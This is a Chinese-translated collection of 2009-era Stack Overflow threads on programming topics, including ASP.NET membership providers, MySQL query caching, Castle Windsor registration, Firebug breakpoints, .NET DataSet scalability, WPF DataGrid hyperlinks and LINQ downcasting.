对于任何感兴趣的人，我设法通过创建一个单例来容纳 BuildMetaData 类的实例来解决这个问题。

我的 Ruby 代码最终看起来像这样：

```
module MetaBuilder
  module Dsl
    module Main

      def install(name, &block)
        yield self if block_given?
      end

      def get_from(name, url)
        puts name
        puts url
      end

      def description(desc)
         meta.metadata.Description = desc
      end

      class MetaDataAccessor
        attr_accessor :metadata

        private
        def initialize
          @metadata = Horn::Core::Dsl::BuildMetaData.new
        end

        public
        def self.instance
          @@instance ||= new
        end

        def self.get_metadata
            @metadata
        end
      end
    end
  end
end

def meta
  MetaBuilder::Dsl::Main::MetaDataAccessor.instance
end

class ClrAccessor
  def get_build_metadata
    meta.metadata
  end
end

include MetaBuilder::Dsl::Main 
```

我创建了 MetaDataAccessor 来保留一个单例 BuildMetaData 实例。

我无法计算出 C# 代码来访问嵌套在模块之间的完全限定类，因此我创建了 ClrAccessor 类来提供来自 Clr 的访问。

我的 C# 代码最终看起来像这样：

```
var engine = Ruby.CreateEngine();
engine.Runtime.LoadAssembly(typeof(BuildMetaData).Assembly);
engine.ExecuteFile(buildFile);
var klass = engine.Runtime.Globals.GetVariable("ClrAccessor");
var instance = engine.Operations.CreateInstance(klass);
buildMetaData = (BuildMetaData)engine.Operations.InvokeMember(instance, 
"get_build_metadata"); 
```

我相当肯定有一个更简单的方法，但对我来说这是进步。

对这种“围绕房屋”方法的任何投入将不胜感激。

# asp.net - ASP 会员资格奇怪的问题

> ID：651385
> 
> 赞同：4
> 
> 时间：2009-03-16T17:32:56.733
> 
> 标签：asp.net, sql, oracle, membership

我在 ASP .NET 中使用 Membership API，我在登台服务器上遇到了以下问题。该应用程序在我的本地机器上运行良好。数据表存储在 SQL Server 上。我的本地服务器和登台服务器都指向同一个数据库服务器。当我部署到我的登台服务器时，我收到以下错误：

```
 Parser Error Message: The connection name 'OraAspNetConString' was not 
 found in the applications configuration or the connection string is empty. 

    Line 135:    <roleManager>
    Line 136:      <providers>
    Line 137:        <add name="OracleRoleProvider" 

type="Oracle.Web.Security.OracleRoleProvider, Oracle.Web, Version=2.111.6.20,
Culture=neutral, PublicKeyToken=89b483f429c47342" 
connectionStringName="OraAspNetConString" applicationName="" />
    Line 138:        <add name="AspNetSqlRoleProvider"   
connectionStringName="LocalSqlServer" applicationName="/" 
type="System.Web.Security.SqlRoleProvider, System.Web, Version=2.0.0.0, 
Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
    Line 139:        <add name="AspNetWindowsTokenRoleProvider" 
applicationName="/" type="System.Web.Security.WindowsTokenRoleProvider, 
System.Web, Version=2.0.0.0, Culture=neutral, 
PublicKeyToken=b03f5f7f11d50a3a" />

Source File: 
c:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\Config\machine.config
    Line: 137 
```

我不知道为什么它甚至试图对 Oracle 做任何事情，我`web.config`不包含任何与 Oracle 相关的内容。

有没有人知道为什么会这样？

**[编辑]** 在我的本地机器的 machine.config 上，我没有 OracleRoleProvider 键。但是我的登台服务器可以。如果这有帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-02T19:32:43.560

这里是老问题，但我刚刚遇到它并想分享更多细节。

首先，如果您需要`<clear/>`在 connectionStrings 块中执行操作，最简单的解决方案是将空白 OraAspNetConString 连接字符串条目添加回您的 web.config：

```
<connectionStrings>
    <clear />
      <add name="OraAspNetConString" connectionString=" "/>    
</connectionStrings> 
```

当你在你[的任何机器上安装 Oracle .NET 包](http://docs.oracle.com/cd/B28359_01/win.111/e10928/IntroInstallation.htm)时会发生什么，它会在你的 machine.config 中安装大量不同的提供程序以及作为机器级连接字符串的 OraAspNetConString。该`<clear/>`元素摆脱了那个 OraAspNetConString，并且由于 Oracle 的 machine.config 添加，默认加载的所有其他 Oracle 提供程序在找不到连接字符串时都会崩溃。

您在此处探索使用成员资格提供者的元素的另一个答案不起作用，因为在 machine.config 中添加的大多数其他 oracle 提供者仍将寻找该**OraAspNetConString**，因此仅清除一个提供者对您没有帮助.

这些是他们安装到我的 machine.config 中的所有提供程序：

```
<membership><providers>
    <add name="OracleMembershipProvider" type="Oracle.Web.Security.OracleMembershipProvider, Oracle.Web, Version=4.112.2.0, Culture=neutral, PublicKeyToken=89b483f429c47342" connectionStringName="OraAspNetConString" applicationName="" />
</providers></membership>
<profile><providers>
    <add name="OracleProfileProvider" type="Oracle.Web.Profile.OracleProfileProvider, Oracle.Web, Version=4.112.2.0, Culture=neutral, PublicKeyToken=89b483f429c47342" connectionStringName="OraAspNetConString" applicationName=""/>
</providers></profile>
<roleManager><providers>
    <add name="OracleRoleProvider" type="Oracle.Web.Security.OracleRoleProvider, Oracle.Web, Version=4.112.2.0, Culture=neutral, PublicKeyToken=89b483f429c47342" connectionStringName="OraAspNetConString" applicationName=""/>
</providers></roleManager>
<siteMap><providers>
    <add name="OracleSiteMapProvider" type="Oracle.Web.SiteMap.OracleSiteMapProvider, Oracle.Web, Version=4.112.2.0, Culture=neutral, PublicKeyToken=89b483f429c47342" connectionStringName="OraAspNetConString" applicationName="" securityTrimmingEnabled="true"/>
</providers></siteMap>
<webParts>
  <personalization>
    <providers>
      <add name="OraclePersonalizationProvider" type="Oracle.Web.Personalization.OraclePersonalizationProvider, Oracle.Web, Version=4.112.2.0, Culture=neutral, PublicKeyToken=89b483f429c47342" connectionStringName="OraAspNetConString" applicationName=""/>
    </providers>
  </personalization>
</webParts>
<healthMonitoring><providers>
    <add name="OracleWebEventProvider" type="Oracle.Web.Management.OracleWebEventProvider, Oracle.Web, Version=4.112.2.0, Culture=neutral, PublicKeyToken=89b483f429c47342" connectionStringName="OraAspNetConString" buffer="true" bufferMode="OracleNotification"/>
</providers></healthMonitoring> 
```

因此，如果您不想添加空白的 OraAspNetConString，则必须确保您要么`<clear/>`使用以下每个 Oracle 提供程序，要么`<remove name=x />`像这样向每个提供程序类添加一个元素：

```
<membership><providers>
    <remove name="OracleMembershipProvider" />
</providers></membership>
<profile><providers>
    <remove name="OracleProfileProvider" />
</providers></profile>
<roleManager><providers>
    <remove name="OracleRoleProvider" />
</providers></roleManager>
<siteMap><providers>
    <remove name="OracleSiteMapProvider" />
</providers></siteMap>
<healthMonitoring><providers>
    <remove name="OracleWebEventProvider" />
</providers></healthMonitoring> 
```

我从未在我的 Web 应用程序中处理任何站点地图或健康监控代码，但我仍然必须`<remove/>`在我的 web.config 中为不同的提供者手动添加这些元素，否则在寻找不存在的 OraAspNetConString 连接字符串时会崩溃。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-16T17:40:38.883

你需要在你的配置文件中定义你自己的提供者，例如这里是一个会员提供者：

```
 <membership defaultProvider="SqlProvider" userIsOnlineTimeWindow="15">
        <providers>
            <clear/>
            <add name="SqlProvider" type="System.Web.Security.SqlMembershipProvider" connectionStringName="MyConnection" applicationName="MyApp"/>
        </providers>
    </membership> 
```

基本上这将删除在系统级别定义的所有提供程序，这就是我们要清除的原因，然后您定义新的提供程序。如果您需要系统级别的提供程序，您可以将自己的提供程序定义为默认值，或者在您的应用程序代码中专门请求您的提供程序。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T17:35:22.797

这个错误是说你在 machine.conf 而不是 web.config 中有那个。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-08-22T18:17:14.170

只需为“OraAspNetConString”添加一个空的 ConnectionString 即可为我工作

```
<connectionStrings>
    <clear />
    <add name="OraAspNetConString" connectionString=" "/>
    .................. your other connectionstrings goes here .....
</connectionStrings> 
```

# mysql - MySQL缓存插入查询吗？

> ID：651387
> 
> 赞同：0
> 
> 时间：2009-03-16T17:33:13.020
> 
> 标签：mysql

当我运行一个将 50k 记录（包含 10 个小列）插入数据库的大型 MySQL 查询时，我的查询缓存使用量从大约 10MB 飙升到 400MB。MySQL 是否正在缓存我的插入？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-16T17:38:26.487

[MySQL 查询缓存文档](http://dev.mysql.com/doc/refman/5.1/en/query-cache.html)说：

> 查询缓存存储**SELECT 语句的文本以及**发送到客户端的相应结果。如果稍后收到相同的语句，则服务器从查询缓存中检索结果，而不是再次解析和执行该语句。

它不缓存 INSERT 或其他查询。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T17:50:16.257

正如另一位用户所说，MySQL 中有一种机制可以使缓存保持最新。当您执行影响先前存储在缓存中的结果的 INSERT 时，必须更新它以反映新的插入，或者将其删除，以便稍后在再次处理该 SELECT 时再次创建。我怀疑这就是你所看到的。

另一种可能性，虽然更明显，但希望不是您的问题，是如果您使用显示和自动更新表的工具执行此 INSERT，它可能会在您 INSERT 后发出 SELECTS。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T17:38:17.737

它可能正在更新它在内存中的缓存。如果它是一个可能在缓存中的表，那么 MySQL 可能会尝试保持最新。

# api - Castle Windsor Fluent API：明确定义依赖关系

> ID：651392
> 
> 赞同：2
> 
> 时间：2009-03-16T17:34:31.287
> 
> 标签：api, castle-windsor, fluent

鉴于以下配置

```
 Container.Register(Component.For<A>().Named("foo"));
        Container.Register(Component.For<B>().Named("foobar"));

        Container.Register(
            AllTypes.Pick()
            .FromAssemblyNamed("MyAssembly")
            .If(t => t.Name.EndsWith("ABC"))
            .Configure(c => c.LifeStyle.Is(LifestyleType.Transient))
            .WithService.Select(i => typeof(I))
        );

        Container.Register(
            AllTypes.Pick()
            .FromAssemblyNamed("MyAssembly")
            .If(t => t.Name.EndsWith("123"))
            .Configure(c => c.LifeStyle.Is(LifestyleType.Transient))
            .WithService.Select(i => typeof(I))
        ); 
```

如果我知道接口“I”公开了一个属性“P”，并且类 A 和 B 可以分配给 P；我如何明确声明来自 AllTypes 调用的第一个类型集合应该将属性 P 设置为 id 为“foo”的类型，而第二个集合应该将相同的属性设置为 id 为“foobar”的类型“？

使用 XML 配置，这可以通过使用 ${id} 符号显式设置参数来完成。我认为它在流畅的 API 中是相似的。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-17T09:20:53.990

您走在正确的轨道上 - 您需要做的是配置每个组件的参数，根据您的场景为名为“P”的参数提供值“${foo}”或“${foobar}”，这里有一个演示您的场景的工作 xunit 事实（向下滚动到底部以获取实际注册码）。

```
namespace Question651392
{
  public class First123 : I
  {
    public AbstractLetter P { get; set; }
  }

  public class Second123 : I
  {
    public AbstractLetter P { get; set; }
  }

  public class FirstABC : I
  {
    public AbstractLetter P { get; set; }
  }

  public class SecondABC : I
  {
    public AbstractLetter P { get; set; }
  }

  public interface I
  {
    AbstractLetter P { get; set; }
  }

  public abstract class AbstractLetter
  {
  }

  public class B : AbstractLetter
  {
  }

  public class A : AbstractLetter
  {
  }

  public class RegistrationFacts
  {
    [Fact]
    public void EnsureParametersCanBeSetWhenRegisteringComponentsInBulk()
    {
      WindsorContainer Container = new WindsorContainer();

      Container.Register(Component.For<A>().Named("foo"));
      Container.Register(Component.For<B>().Named("foobar"));

      Container.Register(
          AllTypes.Pick()
          .FromAssembly(GetType().Assembly)
          .If(t => t.Name.EndsWith("ABC"))
          .Configure(c => c.LifeStyle.Is(LifestyleType.Transient))
          .Configure(c=>c.Parameters(Parameter.ForKey("P").Eq("${foo}")))
          .WithService.Select(new[] { typeof(I) })          
      );

      Container.Register(
          AllTypes.Pick()
          .FromAssembly(GetType().Assembly)
          .If(t => t.Name.EndsWith("123"))
          .Configure(c => c.LifeStyle.Is(LifestyleType.Transient))
          .Configure(c => c.Parameters(Parameter.ForKey("P").Eq("${foobar}")))
          .WithService.Select(new[] { typeof(I)})
      );

      var all = Container.ResolveAll<I>();

      var firstABC = all.Single(i => i is FirstABC);
      Assert.IsType(typeof(A), firstABC.P);

      var first123 = all.Single(i => i is First123);
      Assert.IsType(typeof (B), first123.P);

      Assert.Equal(4, all.Count());
    }
  }
} 
```

希望这可以帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-17T17:45:51.827

在测试这个时要提一件事。

对配置的第二次调用似乎取消了第一次调用。

```
 .Configure(c => c.LifeStyle.Is(LifestyleType.Transient))
      .Configure(c => c.Parameters(Parameter.ForKey("P").Eq("${foobar}"))) 
```

如果你添加到测试

```
 var all2 = Container.ResolveAll<I>();
        Assert.IsTrue(all.Count(i => all2.Contains(i)) == 0); 
```

它会失败，但你会期望它也会通过，因为一切都被宣布为瞬态。这意味着短暂的生活方式丢失了，而是使用了默认的单身生活方式。

将配置调用更改为以下会导致测试通过。

```
 .Configure(c => .LifeStyle.Is(LifestyleType.Transient).Parameters(Parameter.ForKey("P").Eq("${foobar}"))) 
```

谢谢。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-04-23T03:06:36.523

实际上要添加到@Bittercoder 的综合答案，推荐的方法是：

```
.DependsOn(Property.ForKey("P").Is("fooBar")) 
```

# iphone - 如何在 iPhone 上将中文文本音译为拼音？

> ID：651396
> 
> 赞同：3
> 
> 时间：2009-03-16T17:36:06.447
> 
> 标签：iphone, cocoa-touch, localization, internationalization, icu

本地化传奇仍在继续……

所以我试图在我的 iPhone 应用程序中支持中文文本的校对，在和一个以中文为母语的人交谈之后，我想我明白中国人是怎么做到的......

假设您有字符串巴拉克·奥巴马，并且您想弄清楚将其放入中国电话簿的哪个部分（在此示例中，我忽略了名字/姓氏，而仅使用了字符串的第一个字符）...

首先你把它音译成拼音，它给你“balake aobama”然后你根据那个字符串的第一个字符进行整理：“b”

那么问题来了，如何使用 iPhone SDK 从巴拉克·奥巴马到巴拉克奥巴马？貌似手机自带的[ICU](http://site.icu-project.org/)库可以做这种音译，但是我不确定能不能从我的代码中轻松使用，即使可以，也不知道音译能不能用东西包含在电话上的 ICU 构建中。

如果ICU是不行的，有没有人有更好的想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T17:45:49.043

你*必须*用查找表来做这件事。请记住，每个汉字字符（至少）有一个读法，但字符与其发音方式之间的联系是不规则的，有时甚至是任意的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-01-14T17:05:08.330

在最新版本的 iPhone SDK（3.0 和更高版本）中，[UILocalizedIndexedCollat​​ion](http://developer.apple.com/iphone/library/documentation/iPhone/Reference/UILocalizedIndexedCollation_Class/UILocalizedIndexedCollation.html)类可以对中文和 iPhone 支持的所有其他语言进行排序。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T19:27:25.353

请原谅我的无知，但是这种排序规则对您有用吗`-localizedCompare:`？`-compare:options:range:locale:``NSStrings`

# .net - 为什么 .net 客户端配置文件不出现在 Visual Studio 2008 中

> ID：651398
> 
> 赞同：0
> 
> 时间：2009-03-16T17:36:26.493
> 
> 标签：.net, visual-studio-2008

我有 Visual Studio 2008，但在应用程序选项卡的目标配置文件客户端中看不到。

知道为什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T17:38:59.810

我相信这是 SP1 的功能。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T17:41:35.373

John 是对的，它是 SP1 的功能。在 SP1 中，它位于应用程序“选项卡”上，位于目标框架下拉列表下方，并标记为“仅客户端框架子集”。

# c# - 用于 C# 的 SCP

> ID：651399
> 
> 赞同：19
> 
> 时间：2009-03-16T17:36:31.500
> 
> 标签：c#, .net, ssh, scp

是否有提供在 C# 中进行 SCP 传输功能的库？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-03-16T17:43:14.277

你试过[SharpSSH](https://sourceforge.net/projects/sharpssh/)吗？（最后一次更新是 2013 年）

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-06T06:53:51.830

使用[WinSCP .NET 程序集](https://winscp.net/eng/docs/library)。这真的很简单。

# javascript - Firebug - 断点未命中

> ID：651404
> 
> 赞同：38
> 
> 时间：2009-03-16T17:37:54.147
> 
> 标签：javascript, firebug, breakpoints, hit, script-debugging

我在外部 JS 文件中设置断点，但我无法让 Firebug 以一致的方式命中断点。它有时有效，但大多数时候无效。我可以让它工作的唯一方法是打开“中断所有错误”

我用过调试器；声明以及没有任何运气。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2009-03-16T20:50:46.633

如果行号不是绿色，则似乎 Firebug 无法调试该部分代码，因为它超出了范围。所以，如果你使用类似 $(function () { ... }); Firebug 将无法访问函数和变量。

那有意义吗？

此外，是否有可能某些其他功能或某些东西覆盖了您尝试调试的功能。如果您将相同的 JS 文件包含两次，这甚至是可能的。

希望有帮助。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-08-13T01:10:48.367

我在尝试使用 Firebug 1.4 调试框架内的页面时遇到了这个问题。从“此框架”上下文菜单中选择“仅显示此框架”或“在新选项卡中打开框架”然后刷新页面似乎使脚本可调试。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-03-16T17:42:32.047

Firebug 是否在脚本选项卡中显示带有绿色行号的代码？这表示可调试的代码行。

我经历过这种症状，有时没有一个行号是绿色的。我刷新页面，神奇的是，它们又变绿了。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2009-03-16T21:02:21.910

我也经常遇到这个问题。我发现重新打开选项卡似乎有帮助（断点不会丢失）。但是“Break on all errors”看起来是最可靠的破解方式。

我很少需要一些关于 IE 的好东西，但在这种情况下它是正确的。在 VS 中调试 JavaScript 就可以了。它会毫无问题地命中断点（“调试器”），并阻止页面上的所有其他 JavaScript 代码执行。所以我经常用它作为备份。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-08-25T20:03:45.897

Firebug 上的“控制台”选项卡是否显示任何其他 JavaScript 的错误？我发现如果调试断点之前的代码存在 JavaScript 错误，那么在修复前面的断点之前，它永远不会到达该代码行。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2014-08-11T22:41:22.543

我也间歇性地遇到这个问题。我从断点下拉菜单中选择了“禁用所有断点”和“启用所有断点”，它开始工作。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2012-10-09T04:41:11.650

我在这上面花了 1 个小时。

我有一个`<script>`这样的标签：

```
<!-- jQuery Validate -->
<script src="http://ajax.aspnetcdn.com/ajax/jquery.validate/1.10.0/jquery.validate.min.js" type="text/javascript"> 
```

你能发现问题吗？

好吧，我花了这么长时间才发现它。缺少`/`关闭`<script>`标签。

```
<!-- jQuery Validate -->
<script src="http://ajax.aspnetcdn.com/ajax/jquery.validate/1.10.0/jquery.validate.min.js" type="text/javascript" /> 
```

这肯定是由于一些复制/粘贴然后尝试更改代码......在这种情况下我只是装傻！:)

添加后，`/`我能够让断点在 Firebug 中工作。这说得通。

终于我可以看到那些祝福的绿色数字了。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2011-02-24T21:24:07.257

只是为提到的那些增加另一种可能性。

这自然发生在我面临着在生产中修复某些东西的压力时。

我无意中引入了一个语法错误：

```
function: myFunc(){}

// function body

} 
```

就这样。在控制台日志的开头有一个错误，但我没有注意到它。我一直在尝试调试该文件，但 Firebug 不会介入。

因此，如果您遇到这种情况：检查控制台，可能存在语法错误导致文件加载短路。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2015-02-23T15:19:14.343

对我来说，在我删除所有`document.write()`电话后它就起作用了。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2015-03-09T17:08:30.980

FF 36 和 FB 2.0.8 存在同样的问题：控制台中没有错误，代码工作正常，但 FB 显示 HTML 而不是 JS，在`debugger`断点处停止但在某个随机 HTML 行处显示，不会在常规断点处停止。

> 我通过从页面中提取 JS 并将其移动到自己的 JS 文件中来解决它。

但是有一个问题：当脚本驻留在自己的 JS 文件中时，即使使用`window.varName`语法，我也无法让“全局”变量在 FF 中工作（无论代码在哪里，在 IE 中都可以正常工作）。所以最终在 FB 中从一个单独的文件中调试，但恢复为内联进行生产。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2016-05-02T23:02:48.693

我也有这个问题。也许与 KIT-Inwi 的回答有关……但我在每次页面加载时使用 PHP 生成随机行。

Firebug 似乎记住了*整个 HTML 页面*放置断点的行号，不一定是 Javascript 的行，这意味着您在此页面加载时放置断点的行号不一定是同一行下次加载它的代码，所以断点会出现“跳转”。

我不确定您如何使用每次更改的动态内容来解决它，但我通过删除随机行来修复它，因此带有断点的行在每次页面加载时都是相同的。

# .net - 数据集是否可扩展？像 myspace 这样的网站会使用它们进行数据检索吗？

> ID：651412
> 
> 赞同：4
> 
> 时间：2009-03-16T17:39:48.700
> 
> 标签：.net, performance, dataset

数据集的可扩展性如何？团队成员希望使用数据集进行数据检索和操作，使用内置的数据完整性等来使用对象执行数据更新等。

我们的系统预计将扩展到数百万用户。

我读过的所有内容都是针对企业环境中的数据集的，我在这里错了还是什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-16T17:46:01.790

*免责声明-这些是我从个人经验中得出的意见*

数据集使用起来非常痛苦，除非您对它们有特定需求，否则我真的不建议您使用它们。我曾参与过 .NET 1.0 时代的大型项目（包含数千个数据集），我发现它们**很难维护、使用和测试**。除非您使用强类型数据集，否则您必须使用基于数组的语法来访问所有内容，而您将永远花在维护上。

我真的建议使用像[NHibernate](http://www.hibernate.org/343.html)这样的 ORM 。[您可以通过这些屏幕截图](http://www.summerofnhibernate.com/)了解有关 NHibernate 的更多信息。

如果您对 Salable 架构感兴趣，您应该查看[High Scalability](http://highscalability.com/)网站，在那里您将能够找到您在问题中提到的[MySpace 架构。](http://highscalability.com/myspace-architecture)

有关数据集的更公正的意见，请查看此[MSDN 链接](http://msdn.microsoft.com/en-gb/magazine/cc163751.aspx)（摘要如下）

**何时使用哪个**

> DataSet 和自定义类都不会限制您可以做的任何事情，并且两者都可以用来实现相同的目标。也就是说，DataSet 是用于原型应用程序的出色工具，并且代表了在某种紧急情况下构建系统的出色解决方案——预算有限、截止日期临近或应用程序生命周期短。对于相对简单的应用程序，自定义实体可能会增加不必要的复杂性。在这种情况下，我建议您认真考虑使用 DataSets。
> 
> 在需要几个月才能完成的大型、持久、复杂的企业系统的经济中，构建和实现一堆集合类的成本相对较低，并且只发生一次。在性能、表现力、可读性和易维护性方面的优势在很大程度上回报了投资。您不必拘泥于数据的表格呈现。业务规则和自定义业务实体不能总是适应看起来像一组表。一般来说，您应该避免将数据调整到数据容器中——我会说恰恰相反。最后，使用自定义类使单元测试更容易，因为类和逻辑比数据集更严格相关。[在图 3](http://msdn.microsoft.com/en-gb/magazine/cc163751.aspx#S7)，您会发现一个包含数据集、类型化数据集和自定义实体的概要表，并按多个因素进行了比较。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-23T19:02:52.857

数据集很重。它们提供的不仅仅是内存数据。它们具有更改跟踪、视图、关系等。如果您使用这些功能 - 那么它们可能比您自己提供的更好。

人们遇到麻烦的地方是当他们将 DataSets 用作某种 HashTable 时，然后抱怨它们比 DataReader 慢。嗯，是的——如果你只用一个 DataReader 就够了，那么一个 DataSet 简直是矫枉过正——你运行的代码比你需要的多 90%。

所以，你必须问自己的真正问题是——我需要 DataReader 还是 DataSet？如果您需要 DataSet 的功能，那么您可能应该围绕它包装一个抽象并从那里开始。如果需要，您可以稍后进行优化（无论您做什么，一旦执行一些负载测试，您可能需要进行优化）。

编辑：我只想指出，我在这里谈论的是*可扩展性*问题——请不要读到我是 DataSet 的 API 设计、类型化的 DataSet 代码生成等的粉丝——我不是。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-23T18:41:13.860

是的，您对问题的企业部分是错误的——它们在企业环境中是可以接受的。问题通常在于开发人员对 DataSet 的了解以及您将能够编写自己的更高效机制的错误想法。这就是您开始重新创建通用功能之前的全部内容，例如过滤对象集合、工作单元机制等。

这是一个与扩展到数百万用户不同的问题。您可能想要修剪任何脂肪，这需要您自定义所有数据逻辑。走 POCO 可能不是正确的方向。使用 POCO，您仍在将非 db-aware 结构映射到单独层中的数据库，添加额外的逻辑，当扩展到高级别时开始显示您的性能磨损。

您需要提供一组更具体的问题才能获得更好的答案，但“企业”不一定等于“数百万用户”。由于 POCO 对应用程序中使用的模型的“简化”以及 DataSet 的广泛采用和理解（在大多数开发人员中），POCO、DataSet 等有助于快速开发（不管 cgreeno 不支持的意见如何）以及可维护性。但是为了支持数百万用户，您可能会为了性能和可伸缩性设计元素而牺牲可维护性。您只需要决定哪些“能力”更重要。

顺便说一句，类型化的数据集是数据集。说有类型的数据集比无类型的数据集快就像说我可以跑得快，但是有了这个名称标签，我可以跑得更快。小心调查关于任何特定工具的不受支持的说法并要求提供证据。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-24T01:15:27.157

对于读取数据，DataSet 就可以了。它们应该只比自定义对象慢一点，当然您需要性能测试来验证这一点。

对于写入数据，您确实需要更高效的东西。仅更新更改的列或非常特定的存储过程的动态 SQL 将为您提供更好的结果。

请记住，您的数据库可能会成为瓶颈，因此请确保您对应用程序进行的每个 SQL 调用进行概要分析。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-16T17:43:36.413

除了性能之外，我不会将它们用于维护的角度。我更喜欢使用 POCO 对象和 ORM。

使用数据集可能不会阻止您进行扩展，但有更快的替代方案。例如从数据阅读器直接读取到 POCO。

而且，您能够回答这个问题的唯一方法是设置一个测试环境，以及一个模拟您在真实应用程序中将要做什么的测试应用程序，然后把它搞砸。

您的环境应该模仿您的最终状态（如果您要拥有一个带有专用 sql 框的场，请不要针对 web 和 sql 的单个服务器运行测试）

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2009-03-16T17:54:05.403

太多变量无法以任何有用的方式回答性能方面的问题（首先，用户总数是一个无用的衡量标准；每秒峰值请求将是一个更好的开始）。

我会避免使用数据集，除非您需要它们能够反复操作内存中的数据。如果您需要一次性传递数据，请使用 DataReader 并避免将所有内容都保存在内存中。

（当然，ORM 是另一种选择。）

# tfs - AssemblyCleanup 是否有时间限制

> ID：651414
> 
> 赞同：0
> 
> 时间：2009-03-16T17:40:24.220
> 
> 标签：tfs, mstest

标有 AssemblyCleanup 属性的方法是否有最大时间限制？

我们有一个方法可以对测试运行期间添加的测试数据执行大量数据库删除，但我们没有看到该方法有时间完全完成。

（我们使用的是 Visual Studio 2008 Team System。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-16T18:22:14.447

没有记录意味着没有定义。

尝试长时间运行，`Thread.Sleep`看看会发生什么。

# wpf - 使用 WPFToolKit 的 DataGridHyperlinkColumn

> ID：651416
> 
> 赞同：4
> 
> 时间：2009-03-16T17:40:54.203
> 
> 标签：wpf, vb.net, xaml, datagrid, wpftoolkit

我正在使用 WPFToolkit 的 Datagrid 控件。我可以填充数据网格，但我遇到了 DataGridHyperlinkColumn 的问题。我希望它将链接直观地显示为人员的名称，但链接可以转到 UriLink 的值。

我怎样才能做到这一点？我究竟做错了什么？

xml:

```
<dg:DataGridHyperlinkColumn Header="Person Name" Width="200" 
Binding="{Binding Path=PersonName}" IsReadOnly="True" 
TargetName="{Binding Path=UriLink}"></dg:DataGridHyperlinkColumn> 
```

或者，我宁愿放置一个事件处理程序，并创建要导航到的页面对象，但我似乎无法从事件的两个参数（在本例中为 o 和 e）中提取任何数据，其中 obj1/obj2是单击的超链接行的对象/变量。

替代 Xaml：

```
<dg:DataGridHyperlinkColumn Header="Person Name" Width="200" 
Binding="{Binding Path=PersonName}" IsReadOnly="True" 
TargetName="{Binding Path=UriLink}">
    <dg:DataGridHyperlinkColumn.ElementStyle>
    <Style TargetType="TextBlock">
    <EventSetter Event="Hyperlink.Click" Handler="OnHyperlinkClick" />
    </Style>
    </dg:DataGridHyperlinkColumn.ElementStyle>
    </dg:DataGridHyperlinkColumn> 
```

VB 代码（用于替代 Xaml）：

```
Private Sub OnHyperlinkClick(ByVal o As Object, ByVal e As RoutedEventArgs)

        'TODO: Create page to navigate to
        Dim page As New RedirectPage(obj1, obj2)
        Me.NavigationService.Navigate(page)

End Sub 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-25T19:03:22.840

将 o 转换为 TextBlock，它的 DataContext 是您的行的对象。您可以将其转换为您的对象类型。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-21T23:34:06.403

也许[Hyperlink.RequestNavigate](http://msdn.microsoft.com/en-us/library/system.windows.documents.hyperlink.requestnavigate.aspx)事件会更好？看起来`EventArgs`包含导航目标的URI，应该是超链接控件本身的URI。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T13:47:39.110

正如 AKCODEr 所说，它在 DataContext 中。使用 OnHyperlinkClick 事件处理程序，我使用了以下内容：

```
DirectCast(DirectCast(DirectCast(e.Source, System.Object), System.Windows.Documents.Hyperlink).DataContext, System.Object) 
```

# c# - 向下转型和 Linq

> ID：651419
> 
> 赞同：1
> 
> 时间：2009-03-16T17:42:13.343
> 
> 标签：c#, linq, casting

我有一个名为 LabFileBase 的基类。我已经构建了一个 List 并将我的派生类添加到其中。我想根据我定义的键在列表中搜索特定对象。我遇到的问题是你如何在 LINQ 表达式中沮丧？

这是一些示例代码：

```
public abstract class LabFileBase
{
}

public class Sample1 : LabFileBase
{    
    public string ID {get;set;}
    public string Name {get;set;}
    //..
}

public class Sample2 : LabFileBase
{    
    public string ID {get;set;}
    public string Name {get;set;}
    //..
} 
```

我想搜索特定的 Sample2 类型，但如果我使用这样的常规 foreach 循环，我需要向下转换：

```
foreach(var s in processedFiles)  //processedFiles is a List<LabFileBase>
     if (s is Sample2)
         var found = s as Sample2;
             if (found.ID = ID && found.Name == "Thing I'm looking for")
                  //do extra work 
```

我宁愿有这样的东西：

```
var result = processedFiles.Select(s => s.ID == SomeID && s.Name == SomeName); 
```

这是可能的吗，涉及什么句法标点符号，或者是`foreach`我唯一的选择，因为对象不同。Sample1 和 Sample2 只有 ID 和 Name 作为相同的字段。

